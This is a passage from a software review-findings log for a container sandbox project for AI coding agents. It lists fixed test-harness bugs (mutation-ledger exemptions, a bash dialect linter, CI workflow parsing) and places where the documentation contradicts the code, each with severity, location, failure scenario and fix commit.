- Location: `tests/test-layer-containment.sh: \`nightly_set="$( { sel --exclude packages; sel --tags packages; } | sort -u )"\``, and `pr_set="$(sel --tags fast --exclude needs-external,needs-dns)"`
- Introduced: 482f30a (pre-window). The window added the `services`/`mariadb` variants and the `packages-services` job without updating the model.
- What's wrong: both selections are hardcoded literals instead of being read from the workflows. `sel --tags packages` covers every variant, but nightly's packages jobs only run `--variant agents|native|services|mariadb`, and `integration-full` excludes `packages`. So the guard credits nightly with cases nightly never runs:
  - a `packages` case with no `# image:` header (the default variant);
  - any variant whose nightly job is deleted.
- PR args are also not derived from integration.yml, so a change there is invisible to the guard.
- Failure scenario: a planted case `799-planted` tagged `packages fast` with no image header is selected by the PR gate (`--tags fast --exclude needs-external,needs-dns`) and by no nightly job, yet test-layer-containment prints `PASS: PR selection ⊆ nightly selection … 0 failure(s)`. Deleting the whole `packages-services:` job (which drops 785/790/800/810 from every CI layer) also leaves the test at 0 failures.
- Evidence: I reproduced both in scratch worktree wt3. The dry-run per nightly variant shows 799 is not run; the containment test reports 0 failure(s). At HEAD every packages case declares a variant, so the breach is latent.
- Fix direction:
  - Derive each layer's run.sh argument lists from the workflow jobs (as wf_job_key does for the hermetic job), and compute nightly as the union of each job's `--dry-run`.
  - Or assert explicitly that `sel --tags packages` equals the union over the variant jobs.

### TST-3: check-ledger excuses a genuine SURVIVOR when any sibling mutant of the same identity was UNPROVEN
- **Status: FIXED (batch 7)** — `e84d08a` (the exemption needs every non-killed record of the identity to be UNPROVEN); `tests/test-falsify-ledger.sh` demonstration 5, both record orders.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced with a synthetic run record)
- Location: `tests/falsify/check-ledger.sh: \`cl_check_run()\``. The relevant code is `if [[ -n "${CL_UNPROVEN[$ident]:-}" ]]; then cl_note "UNPROVEN, not required to be classified: …"`. `cl_read_run()` sets `CL_UNPROVEN[$ident]=1` per identity, not per damage.
- Introduced: 9ce2506 (2026-08-16). The window's ratchet relies on it.
- What's wrong: an identity is `file:operator:sha1(original line)`, and one identity can carry several distinct damages (one line with two `||`, repeated identical lines). The UNPROVEN exemption is keyed on the identity. So if one damage SURVIVED and another merely timed out, the survivor needs no ledger entry and check B never fires. In this run, 149 identities carried more than one mutant, so the case is reachable. It was not hit at HEAD: the one mixed UNPROVEN identity, start-services.sh cond-negate d6e00d…, had a KILLED sibling, not a SURVIVED one.
- Failure scenario: a run whose output holds `MUTANT|SURVIVED|<id>|…` and `MUTANT|UNPROVEN|<id>|…`, checked against an empty ledger with `--strict`, returns `OK: 0 problem(s) … 1 unproven unclassified`, rc 0. Drop the UNPROVEN line and the same SURVIVED record gives `ERROR: … SURVIVED … but has no entry`, rc 1. The exemption depends on load, so a host or CI run under load can hide a real GAP.
- Evidence: repro files are in /tmp/claude-1000/-home-ihudak-dev-ai-tools-ai-containers/002098a4-b5ad-4f57-bc49-6373376abc59/scratchpad/tests-ci/cl/ (both rc's shown above). No test in tests/test-falsify-*.sh covers a mixed SURVIVED+UNPROVEN identity.
- Fix direction: exempt only identities where every non-KILLED record is UNPROVEN, i.e. track SURVIVED separately from UNPROVEN and require an entry whenever at least one record is SURVIVED.

### TST-4: tests/integration/minimal-conf.sh lets pinned values of newer keys through, so the developer's sandbox.conf leaks into the corpus images
- **Status: FIXED (batch 7)** — `e09a674` (every key with a value becomes OFF; nvm-version, not a component, becomes empty), plus a per-variant `validate_config` check in `9142ea4`; new `tests/test-minimal-conf.sh`, partly derived from the real sandbox.conf.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `tests/integration/minimal-conf.sh: \`s/^(node|python|ruby|rust|go|openjdk|graalvm-ce|graalvm-oracle|kotlin|scala|maven|gradle|db-clients|angular-cli)=.*/\1=/\``
- Introduced: when `postgres=`, `mariadb=`, `mongo=`, `playwright=` (version grammars) and the tools.d keys landed. None was added to this list.
- What's wrong: only `=ON` values and the listed version-list keys are reset. A pinned value such as `postgres=16`, `mariadb=11.4`, `mongo=8.2`, `playwright=1.50.0` or `dtctl=0.25.0` survives into every variant's config. That contradicts docs/testing.md's "A launcher case never inherits the developer's sandbox.conf".
- Failure scenario: an engine checkout with `mariadb=11.4` builds the `services` variant (`redis=ON mysql=ON mongo=ON`) with mariadb still on. build.sh then refuses: `ERROR: mysql and mariadb are both on; choose one.` → 785/790/800 FAIL as "image variant services failed to build". Separately, `postgres=16` silently adds a PostgreSQL server to the default image and to every launcher case.
- Evidence: `minimal-conf.sh dev.conf redis=ON mysql=ON mongo=ON` emits `postgres=16`, `mariadb=11.4`, `playwright=1.50.0`, `dtctl=0.25.0` unchanged.
- Fix direction: reset every non-empty value of every key to OFF or empty, not only `ON` and a hand-kept list. Or derive the list from build.sh's `validate_config`.

### TST-5: bash-dialect-lint lets post-floor constructs through (`${x@k}`, `${| …;}`, `shopt -s patsub_replacement`)
- **Status: FIXED (batch 7)** — `17b073f` (`@k` in its own 5.2 row, the 5.3 REPLY form, `patsub_replacement`, subscripted and positional/special parameters; regexes may use alternation). The bash 5.1.16 behaviour is in docs/superpowers/to-test.md for the floor container.
- Severity: LOW — Confidence: CONFIRMED (reproduced on ubuntu:22.04 / 24.04)
- Location: `tests/bash-dialect-lint.sh: \`'5 1|case-mod-expansion|\$\{[A-Za-z_][A-Za-z0-9_]*@[UuLKk]\}|case-modifying parameter expansion (@U/@u/@L/@K/@k)'\``, and `'5 3|dollar-brace-space|\$\{[[:space:]]|…'`
- What's wrong:
  - `@k` is bash 5.2. bash 5.1.16 reports `${x@k}: bad substitution`, but `@k` sits in a row tagged 5.1, which is permitted at floor 5.1.
  - bash 5.3's `${| cmd; }` form has no space after `${` and is not matched (bash 5.2 rejects it).
  - The 5.2 `patsub_replacement` shopt (which also changes what `&` means in `${v/p/&}`) has no row.
  - Array forms (`${a[@]@Q}`) are never matched by either expansion rule.
- Failure scenario: a probe file holding `echo "${x@k}"`, `echo "${|REPLY=hi;}"` and `shopt -s patsub_replacement` gives `bash-dialect-lint.sh probe.sh` → rc 0. Under the 5.1 floor container the first line dies.
- Fix direction: split `@k` into a `5 2` row, add `\$\{\|` (5.3) and `patsub_replacement` (5.2) rows, and allow a `[...]` subscript in the expansion regexes.

### TST-6: wf_triggers_on misses three of GitHub's four `on:` spellings, so an `exempt` workflow row's "VERIFIED not pull_request-triggered" claim can be false
- **Status: FIXED (batch 7)** — `6b6873c` (scalar, flow list, sequence and block map at any indentation; rc 2 for what it cannot read, which fails an exempt row), and in `9142ea4` a flow collection on the line after `on:`.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `tests/lib-layer-checks.sh: \`wf_triggers_on()\``. It only matches `on:` on its own line followed by a key indented exactly two spaces.
- What's wrong: it misses `on: pull_request`, `on: [push, pull_request]`, `on:` followed by `- pull_request`, and any indentation other than two spaces. test-layer-containment.sh calls this the verification that makes `coverage=exempt` "not merely trusted".
- Failure scenario: a new workflow `on: [push, pull_request]` that runs `./tests/run-all.sh`, registered as `workflow|x.yml|exempt|…`, passes as "verified NOT pull_request-triggered". Its steps are never classified, which is the bypass the registry exists to close.
- Evidence: wf_triggers_on returned "MISSED" for all four fixture spellings (a–d).
- Fix direction: also match the scalar and flow-list forms, and the `- name` sequence form, at any indentation. Or fail an exempt row whose `on:` is not in the one parsed shape.

### TST-7: demonstrate-needs-rebuild.sh `--help` prints the wrong lines; its cleanup leaks services/mariadb images; docs count is stale
- **Status: FIXED (batch 7)** — `59c182d` (`--help` from the `# Usage:` marker; the cleanup removes every tag run.sh's `variant_image()` gives; counts dropped), and in `9142ea4` a shellcheck source directive the full-tree gate needs. New `tests/test-demonstrate-needs-rebuild.sh`; the real interrupt on a Docker host is in docs/superpowers/to-test.md.
- Severity: LOW — Confidence: CONFIRMED
- Location:
  - `tests/integration/demonstrate-needs-rebuild.sh: \`-h|--help)         sed -n '68,74p' "${BASH_SOURCE[0]}"; exit 0 ;;\``
  - its `cleanup()`: `docker rmi -f "$IT_IMAGE" "$IT_IMAGE-agents" "$IT_IMAGE-native"`
- What's wrong:
  - `--help` prints the tail of the "NAMING" paragraph and the first Usage line. It is a line-number range, which the repo's own citing rule warns about.
  - The interrupt cleanup names three of the five variant tags, so an interrupted services or mariadb rebuild leaves its multi-GB image behind. run.sh's own per-variant rmi does not run when the script is interrupted.
  - docs/testing.md says the needs-rebuild set is "nine today" and the script header says "all thirty-four". lib-rebuild.sh's predicate selects 36 at HEAD.
- Evidence: output of `bash tests/integration/demonstrate-needs-rebuild.sh --help` (shown above); `patch_needs_rebuild` over mutations/ finds 43 rebuild patches, of which 36 are outside network-mode/delivery.
- Fix direction: print the help from a marker, list the tags with `variant_image` over all known variants, and drop the hardcoded counts.

### TST-8: update-nvm-version.yml PR body claims it changed sandbox.conf
- **Status: FIXED (batch 7)** — `1413b60` (bullet dropped; AGENTS.md and docs/configuration.md reworded), made BSD-sed-safe in `9142ea4`. New `tests/test-nvm-update-workflow.sh` runs the job's own step against a scratch copy.
- Severity: LOW — Confidence: CONFIRMED
- Location: `.github/workflows/update-nvm-version.yml: \`- \`sandbox.conf\` — \`nvm-version\` updated\``
- Introduced: f7cdc3c (2026-08-31). It made the job edit only the Dockerfile and left the PR body template as it was.
- What's wrong: every automated PR tells the reviewer sandbox.conf was changed when it never is. AGENTS.md's "`update-nvm-version.yml` exists solely to keep the key current" is also stale: the key is empty by design now, and the job keeps the Dockerfile ARG current.
- Fix direction: drop the sandbox.conf bullet, and reword the AGENTS.md sentence to say the job maintains `ARG NVM_VERSION`.

### TST-9: The hermetic suite cannot run as root since batch 2, so `suite-floor` and Phase 5's floor container fail 19 tests
- **Status: FIXED (batch 7 follow-up)** — `bf820bd`. `tests/run-all.sh` exports `SANDBOX_UID=1000 SANDBOX_GID=1000` when it runs as root and the run named neither, so the suite still runs as root and the root-only branches still run. test-integration-lib.sh now checks the default identity and an override each on a fresh source of lib.sh, so it no longer depends on what the run exported; test-falsify-historical.sh, whose oracle it is, passes with it. test-launcher-dir-ro.sh T46 passed as root with the export, so the third breakage in "Not the fix" was a non-root effect. Measured as root in `ubuntu:22.04`. New `tests/test-run-all-root-identity.sh` (a fake `id`).
- Found while fixing batch 7; it existed before, from ENV-4's fix in batch 2.
- Severity: HIGH (the floor job has been red since batch 2 merged, so it cannot flag a new floor regression; its other ~80 tests still run and pass) — Confidence: CONFIRMED from CI: `Tests` runs 40386214831 (`0065450`) and 40392002312 (`1a1b701`), job "Shell test suite (bash floor)".
- Location: `sandbox.sh: \`ERROR: the agent must not run as root (SANDBOX_UID=%s, SANDBOX_GID=%s).\``; `.github/workflows/hermetic-checks.yml`'s `suite-floor` job, and `verify-on-host.sh`'s floor `docker run`, both run `./tests/run-all.sh` as root in `ubuntu:22.04`.
- What's wrong: ENV-4's fix refuses a root agent identity, and `sandbox.sh` takes the identity from `id -u` by default. In a root container every test that launches `sandbox.sh` without setting `SANDBOX_UID`/`SANDBOX_GID` stops at the refusal. The 19 are test-architecture-path, container-name, docs-path, env-file, git-internals-ro, launcher-dir-ro, mariadb, mode-capabilities, mode-output-mounts, mongo, mysql, playwright, postgres, redis, repos-path, selinux-label, skill-char-budget, tool-config-mounts and tools-d. The suite is meant to run as root there: several tests have root-only branches (test-launcher-dir-ro.sh's `setpriv` cases).
- Not the fix, measured: exporting `SANDBOX_UID=1000 SANDBOX_GID=1000` for the whole run (what the refusal tells a root user to do) breaks three other tests that expect the identity to follow the invoking user: test-integration-lib.sh (`IT_LAUNCH_UID follows the invoking user`), test-launcher-dir-ro.sh T46, and test-falsify-historical.sh, whose oracle is test-integration-lib.sh. Measured as a non-root user with the variables exported; no root environment was available to measure as root.
- Fix direction: decide per test. Either a launching test sets a non-root identity of its own when `id -u` is 0, or the floor runs move to a non-root user and the root-only branches get a root run of their own. Verify as root (docs/superpowers/to-test.md, batch 7, "Root").

### TST-10: test-repo-git-reset.sh fails wherever git still creates `.git/branches` (git 2.34 and 2.43, so the floor image and Ubuntu 24.04)
- **Status: FIXED (batch 7 follow-up)** — `4cdd310`. The helper clones with `--template=`, so the clone's `.git`, and with it the volume's after a reset, has no `branches/`, `description`, `info/` or sample hooks. The assertion is unchanged.
- Found while fixing batch 7; it existed before, from batch 2's REPO-1 redesign.
- Severity: MEDIUM (red on a stock Ubuntu 22.04 or 24.04 host and in the floor job; CI's `suite` job, on GitHub's own git build, passes it) — Confidence: CONFIRMED (reproduced at `0065450` and at `1a1b701`, git 2.43.0).
- Location: `tests/test-repo-git-reset.sh: \`&& [[ ! -e "$W/.git/remotes" && ! -e "$W/.git/branches" ]]; then\``
- What's wrong: the assertion checks that a reset leaves no legacy `.git/remotes` or `.git/branches` behind. `reset` replaces the volume's `.git` with a fresh clone's, and git 2.34 and 2.43 still put an empty `branches/` in every new repository from their default template (`git init` lists `branches config description HEAD hooks info objects refs`). The reset worked: the secret commit was not fetched. The failure is `FAIL: legacy remote file was used (log: add first add shared-file ; out: ON|main …)`.
- Fix direction: clone with an empty template (`--template=` / `init.templateDir`), which also drops the sample hooks, or assert that `branches/` names no remote rather than that it is absent. Belongs with batch 4's repo-helper work (`repo-git-reset.sh`).

### TST-11: The ledger ratchet has failed on main since batch 2 with 19 unclassified repo-git-reset.sh survivors and one stale entry
- **Status: FIXED (TST-11 follow-up, 2026-10-27).** New assertions in `tests/test-repo-git-reset.sh` kill 14 of the 20 survivors. They cover:
  - the guess loop, which the old 5c case never reached, because the fresh clone does not read the volume's origin;
  - a primary that is not a branch name;
  - the clone's default branch, which reset must not leave behind;
  - a `reftable/` directory beside a `refs/heads` directory;
  - an unreadable tip;
  - stash traces without a reflog;
  - packed-refs lines that hold no ref;
  - the WARN lines a clean pull must not print;
  - the chown that pull runs, observed through a stub on PATH.

  Ledger entry 16 now holds the seven statuses nothing reads, and the stale `bfefa9b0…` entry is gone. Entry 20 is inspect's double-guarded count, and entry 21 is the report's `d964be5…`, both EQUIVALENT. A root run in `ubuntu:22.04` gave the same verdicts as the non-root one, so nothing needed ENV-DEPENDENT.
- Original finding (found while fixing batch 7; existed before it). Superseded in one point: its claim that the two root-only mutants are killed in CI and must be ENV-DEPENDENT was measured wrong. They survive as root too, and stay EQUIVALENT in entry 16. At `3ffc58d` (`Tests` run 40405941031) the job reports 22 problems: 20 `repo-git-reset.sh` survivors, the stale entry, and one new survivor, `ai-containers-report.sh:logic-flip:d964be591e6317022ad2b9c48f545682f57006ef`, which came with batch 4's change to that script. A run of the `repo-git-reset.sh` target alone as a non-root user (WSL2, after `4cdd310`) gives the same 20 plus two that CI kills, both on the root-only lines `[[ "$(id -u)" == "0" ]] || return 1` and `git config --global --add safe.directory "$1"`. Those two are ENV-DEPENDENT, and the fix must classify them that way.
- Severity: MEDIUM (the falsify job is red, so a new survivor anywhere would not stand out) — Confidence: CONFIRMED from CI: `Tests` run 40386214831, job "Mutation tier (falsify) + survivor-ledger ratchet", `20 problem(s)`.
- Location: `tests/falsify/survivors.txt` against `repo-git-reset.sh`, an active target since batch 2 redesigned it.
- What's wrong: 19 identities (cond-negate, logic-flip and return-flip) SURVIVED with no entry, and the entry `repo-git-reset.sh:logic-flip:bfefa9b0411d327b435d5cd8264b421dfcb5d714` names a mutant that no longer exists.
- Fix direction: kill or classify each survivor and delete the stale entry, in the same PR as batch 4's changes to `repo-git-reset.sh`, then re-score that target.

### TST-12: test-mongo.sh's no-AVX fake dumps core into the repository
- **Status: FIXED (batch 7)** — `5a4305b` (the fake sets `ulimit -c 0` before `kill -ILL $$`).
- Severity: LOW — Confidence: CONFIRMED (found as an untracked `core` after a full suite run while fixing batch 7; `bash tests/run-all.sh test-mongo` reproduces it wherever core dumps are on).
- Location: `tests/test-mongo.sh: \`kill -ILL $$\``
- What's wrong: D10's fake mongod sends itself a real SIGILL, and the kernel writes a `core` file into the working directory, which under `tests/run-all.sh` is the repository root. Nothing removes it, and `git status` shows it.

### TST-13: An interrupt does not stop either demonstrator; the cleanup runs and the next patch is applied and rebuilt
- **Status: FIXED (batch 7 follow-up)** — `494ee11`. `trap cleanup EXIT`, with INT exiting 130 and TERM 143, in both demonstrators. test-demonstrate-needs-rebuild.sh interrupts a run while a stub docker stands in for the build and requires exit 130 with no later step.
- Severity: LOW — Confidence: CONFIRMED (found running docs/superpowers/to-test.md's TST-7 interrupt on a Docker host).
- Also found and fixed in identical code on macOS/Colima, where `tests/test-demonstrate-interrupt.sh` was added: test-demonstrate-needs-rebuild.sh interrupts only that demonstrator, and the new test does the same for demonstrate-network-delivery-tiers.sh (red with the old trap, green with the fix). `tests/falsify/run.sh` has the same trap shape and was measured not to be affected: an INT to its process group 40 s into `--target tests/lib-layer-checks.sh --jobs 2` ended it within 2 s (rc 1), reported the 169 unrun mutants as no verdict, and left no processes behind.
- Location: `tests/integration/demonstrate-needs-rebuild.sh` and `tests/integration/demonstrate-network-delivery-tiers.sh`, both `trap cleanup EXIT INT TERM` before the fix (from bc83027, 2026-08-21).
- What's wrong: a trap on INT that does not exit runs the handler and lets the script go on. The cleanup reverts the mutation and removes the images, and then the loop starts the next patch: Ctrl-C during a multi-patch run applies the next mutation and starts its rebuild. Each further Ctrl-C costs one more patch.
- Evidence: a script with that trap and a three-step loop, interrupted in step 1, printed "cleanup ran" and then ran steps 2 and 3. The new hermetic check, before the fix: rc 1, with the preflight reported FAILED after the interrupt.

### TST-14: `wf_it_selections` silently skips a quoted `run:` value
- **Status: FIXED** (TST-14/15 follow-up, 2026-10-27). `_wf_it_awk()`'s `scan()` now records with guarded `?` any line where `integration` comes before the script name (run.sh) but is not a plain invocation — quoted, inside `bash -c`, through a variable (`"$GITHUB_WORKSPACE"/tests/…`), a `cd` into `tests/integration` before the script, a doubled slash, a plain-text mention outside a comment — and one holding a second invocation after the first one's arguments end; `wf_it_selections()` refuses it naming the step. A file named after the script past the arguments (`| tee tests/integration/run.sh.log`) is not a second invocation. It refuses rather than unquotes: each of those shapes needs its own reading, and a refusal is what the header promises for anything it cannot decide. Eight `unread_case` vectors in `tests/test-layer-checks-parser.sh` and one for the `tee` shape; the first five were each red on the old parser. A second invocation on one line was a sibling omission the review did not list: `run.sh --tags a; run.sh --tags b` recorded only `--tags a`. The review of this fix found no HIGH or MEDIUM; its two LOWs left open are TST-16 and TST-17.
- Found by the batch 7 follow-up review
- Severity: LOW (an omission in nightly still fails the whole-corpus check, so PR ⊆ nightly still holds) — Confidence: CONFIRMED (reproduced with a fixture workflow)
- Location: `tests/lib-layer-checks.sh: \`_wf_it_awk()\``. Its `scan()` needs a space, `;`, `&`, `|` or `(` before `tests/integration/run.sh`, and `key()` does not unquote a `run:` value.
- What's wrong: `run: "./tests/integration/run.sh --tags quoted"`, `run: '…'` and `run: bash -c './tests/integration/run.sh …'` give no record and no refusal. The function's header says everything it cannot decide is rc 1, never a quiet omission.
- Fix direction: refuse a `run:` line that mentions `tests/integration/run.sh` and yields no record, or unquote scalar `run:` values before scanning.

### TST-15: `wf_triggers_on` treats `pull_request_target` and `merge_group` as not PR-triggered
- **Status: FIXED** (TST-14/15 follow-up, 2026-10-27). The predicate is unchanged — `pull_request_target` still is not `pull_request`, as the parser's vectors say — and the claim that relied on it is widened instead: `tests/test-layer-containment.sh` now verifies an `exempt` row against `pull_request`, `pull_request_target` and `merge_group`, failing on the first it triggers on or on an unreadable `on:`. Demonstrated by adding each trigger to `release.yml`: the fixed test fails naming it; the old one passed `merge_group` as "verified NOT pull_request-triggered". `tests/layer-checks.conf`'s row-type comment still says "never runs on pull_request"; it is kept byte-identical with mgd-ai-containers' copy, so it changes there and here together.
- Found by the batch 7 follow-up review; a design choice batch 7 wrote down, in the parser test's "pull_request_target is not pull_request" vectors
- Severity: LOW — Confidence: CONFIRMED (by the test's own vectors)
- Location: `tests/lib-layer-checks.sh: \`wf_triggers_on()\``
- What's wrong: a workflow on `pull_request_target` or `merge_group` that runs checks on every PR or merge can be registered `exempt` and passes as "verified NOT pull_request-triggered". That is the bypass TST-6 closed, moved to a sibling trigger.
- Fix direction: have an `exempt` row also refuse `pull_request_target` and `merge_group`, or rename the claim to what is checked.

## 8. Documentation vs code

### DOC-1: sandbox.conf says commenting out a key disables it, but the next sync turns it back on
- **Status: FIXED (batch 4)** — with PRJ-2, `a3ff97a`; sandbox.conf's header now says sync never re-adds a commented-out key.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `sandbox.conf: \`# Boolean components: set to ON to include, OFF (or comment out) to exclude.\``; `sync-to-projects.sh: \`grep -qE "^${key}=" "$project" 2>/dev/null || added+=("$key")\``
- Introduced: the header comment came in 96481ce (2026-04). It became wrong with a2ea3df (2026-07-24), which added the reconcile.
- What's wrong: `reconcile_sandbox_conf()` sees a commented-out key as missing, so it appends the upstream default.
- Failure scenario: a project disables Copilot by writing `#copilot=ON`. The same applies to claude-code, github-cli and bun, which are all ON upstream. The next `./sync-to-projects.sh` appends `copilot=ON` under a "New options synced from upstream" banner. The next `runme.sh` then rebuilds with Copilot back in, along with its allowlist fragment and its `~/.copilot` mount.
- Evidence:
  - Repro: `sed 's/^copilot=ON/#copilot=ON/' sandbox.conf > proj.conf; bash -c "source ./sync-to-projects.sh; reconcile_sandbox_conf $PWD/sandbox.conf proj.conf <emptydir>"`.
  - Output: `Reconciled sandbox.conf: appended 1 new key(s): copilot`.
  - The file then holds both `#copilot=ON` and `copilot=ON`.
- Fix direction: either change the comment to say "set OFF", or have the reconcile treat `^#\s*key=` as present.

### DOC-2: troubleshooting.md tells users to edit the Dockerfile to compile native gems; the right setting is `c-toolchain=ON`
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `docs/troubleshooting.md: \`add \`build-essential\` back to the Dockerfile if you need to install such gems at runtime\``
- Introduced: 41e820c (the README split). It went stale when 1c5e937 added `c-toolchain`.
- What's wrong: the page says only `ruby=` or `db-clients=` keep the compiler. `build.sh` also keeps it for `c-toolchain`: `build.sh: \`if has_versions ruby || has_versions db-clients || is_enabled c-toolchain; then\``.
- Failure scenario: a user edits the project's `.ai-containers/Dockerfile`. The Dockerfile is a shared file, so `sync-to-projects.sh` overwrites it on the next sync and the fix is lost without any message.
- Fix direction: point to `c-toolchain=ON` and to docs/components/c-toolchain.md.

### DOC-3: AGENTS.md says `project-init.sh` takes a path and a name, but it ignores all arguments
- **Status: FIXED (batch 4)** — `09fe510` (the arguments prefill the path and name prompts; input that runs out fails with a message); AGENTS.md says it is interactive.
- Severity: MEDIUM (raised from LOW in triage: scripted use exits 1 with no output; verified that project-init.sh never reads its positional arguments). Fix batch 4, not docs-only: either implement the documented arguments or change every documented call — Confidence: CONFIRMED (reproduced)
- Location:
  - `AGENTS.md: \`./project-init.sh /path/to/myproject [optional-name]\``
  - `sync-to-projects.sh: \`Run ./project-init.sh <project-path> to register one.\``
  - `ai-containers-report.sh: \`Run ./project-init.sh <path> first\``
- Introduced: f681647 / c094411. This predates the review window, but it is still in AGENTS.md at HEAD.
- What's wrong: `project-init.sh` never reads `$1`/`$2`. It always prompts for the path (`prompt_with_default "Project path"`).
- Failure scenario: an agent follows AGENTS.md and runs `./project-init.sh /tmp/x foo </dev/null`. It exits 1 with no output. `read -p` prints no prompt when stdin is not a TTY, and the failed `read` ends the script under `set -e`. Run interactively, the arguments are silently ignored.
- Evidence: `timeout 5 ./project-init.sh /tmp/nonexist-x foo </dev/null; echo rc=$?` prints `rc=1` and nothing else.
- Fix direction: either fix the usage lines (it is interactive only), or accept positional defaults.

### DOC-4: sandbox.conf says vale "self-updates in place"; it never updates
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `sandbox.conf: \`(agent-tools-reconcile.sh), so \`--no-cache\` does not refresh it and it\`` / `self-updates in place`. AGENTS.md's agent-tier table row says `` `vale` | pinned download ``, and the reconcile header says `vale         pinned download`.
- Introduced: 4dc252c (sandbox.conf) and 2354abc (AGENTS.md).
- What's wrong: `agent-tools-reconcile.sh: \`if [[ -x "$home_root/bin/vale" ]]; then log "vale already present"; return 0; fi\``. Vale is fetched from `releases/latest` once per group and never refreshed. It is not pinned and does not self-update.
- Failure scenario: a user expects a newer Vale and never gets it. docs/components/vale.md and docs/agent-tools.md give the correct method (delete `~/.ai-tools/bin/vale` and restart), but sandbox.conf contradicts them.
- Fix direction: in both places, say "latest at first install, no self-update" and give the delete-and-restart method.

### DOC-5: AGENTS.md and the docs point to README.md sections that no longer exist
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location:
  - `AGENTS.md: \`see the README "sandbox.conf schema versioning" section\`` (twice)
  - `sandbox.conf: \`See README "sandbox.conf schema versioning".\``
  - `bump-sandbox-version.sh: \`# Rules (see README "sandbox.conf schema versioning"):\``
  - `sync-to-projects.sh: \`ensured. See README "sandbox.conf schema versioning".\``
  - `AGENTS.md: \`See the README "Ruby (via rvm)" section\``
  - `group.sh: \`see the README "Container groups" section\``
  - `docs/multiple-projects.md: \`which [migrations](../README.md) it has had applied\``
- What's wrong: README.md is now an 86-line landing page with none of these sections. The content lives in docs/multiple-projects.md (`## sandbox.conf schema versioning`), docs/components/ruby.md and docs/groups.md.
- Failure scenario: an agent about to rename or remove a sandbox.conf key looks for the migration rules in README.md and does not find them.
- Fix direction: point each reference at the docs/ file that now holds the section.

### DOC-6: multiple-projects.md names sandbox.conf "runtime keys" `mode=` and `agents=` that do not exist
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/multiple-projects.md: \`build-time keys (\`ruby=\`, \`db-clients=\`) with runtime ones (\`mode=\`, \`agents=\`),\``
- Introduced: e930d21
- What's wrong: sandbox.conf has no `mode` or `agents` key, and nothing reads one. The network mode is `SANDBOX_MODE` in sandbox.env.
- Failure scenario: a user writes `mode=restricted` in sandbox.conf. It is ignored, and the project keeps starting in the mode sandbox.env sets.
- Fix direction: drop the example, or name `SANDBOX_MODE` in sandbox.env.

### DOC-7: docs describe `<group>/.rvm/` as a directory, but it is a Docker volume
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: the `.rvm/` entry in the layout tree in docs/groups.md, and the `<group>/.rvm/` row in the mount table in docs/repos-and-mounts.md.
- What's wrong: for every group except `host`, `sandbox.sh` mounts the volume `ai-containers-rvm-<group>`: `sandbox.sh: \`config_mount_flags+=(-v "$rvm_vol:$dev_home/.rvm")\``.
- Failure scenario: a user backs up, inspects or `rm -rf`s `~/.ai-containers/<group>/.rvm`. None of that affects the real Ruby installs. The volume is left orphaned, and only `./group.sh gc` cleans it up.
- Fix direction: describe it as a volume and point to `group.sh`.

### DOC-8: getting-started.md names the wrong GitHub downloads as the reason to set `GITHUB_TOKEN`
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- What's wrong: it says vale and goreleaser are fetched from GitHub releases at build time. Vale installs at container start, and goreleaser comes from its apt repository. The real reason, the nvm and pyenv `git clone`s (see the README and AGENTS.md), is not mentioned there.
- Failure scenario: a user without those two tools concludes the token does not apply to them. They then hit the anonymous-throttling 401.

### DOC-9: resources.md says the resource variables apply to `restricted` and `discovery` only
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/resources.md: \`These variables affect \`restricted\` and \`discovery\` runs only\``
- What's wrong: `sandbox.sh` passes `--cpus` and the memory and nofile limits in every mode, including `open`.

### DOC-10: overview.md lists "Ruby (via rvm)" among what the Dockerfile builds
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- What's wrong: Ruby is installed at container start into the group's rvm volume. Nothing Ruby-related is baked into the image, as AGENTS.md itself states.

### DOC-11: components/README.md says no agent CLI is baked into the image; Kiro is
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/components/README.md: \`The agent CLIs themselves are **not baked into the image**\``. This sits under a table that includes `kiro`.
- What's wrong: Kiro is baked (`Dockerfile: \`ARG INSTALL_KIRO=0\``), and the runtime list leaves it out (`sandbox-common.sh: \`for a in claude-code copilot codex gemini graphify vale mkdocs\``).
- Failure scenario: a user restarts the container or runs a plain `./build.sh` to get a newer Kiro. Only `./build.sh --no-cache` refreshes it.

### DOC-12: graphify.md says `~/.claude` is mounted from the host, so the skill appears "in every subsequent container"
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/components/graphify.md: \`Because \`~/.claude/\` is bind-mounted from the host\``
- What's wrong: the mount comes from the group (`"$group_root/.claude"`). It is the host's own `~/.claude` only when `AI_CONTAINER_GROUP=host`.
- Failure scenario: `graphify install` in a `default`-group container does not reach other groups, or Claude Code on the host.

### DOC-13: AGENTS.md's list of optional components omits `acli` and `db-clients`
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `AGENTS.md: \`Optional components: \`copilot\`, ...\``
- What's wrong: both are sandbox.conf keys and are documented later in the file, but this list, which is presented as the whole set, leaves them out. The version-list keys (`node`, `python`, `ruby`, `rust`, `go`, `nvm-version`) are covered separately, so they are fine.

## 9. Found while fixing batches 1 and 2

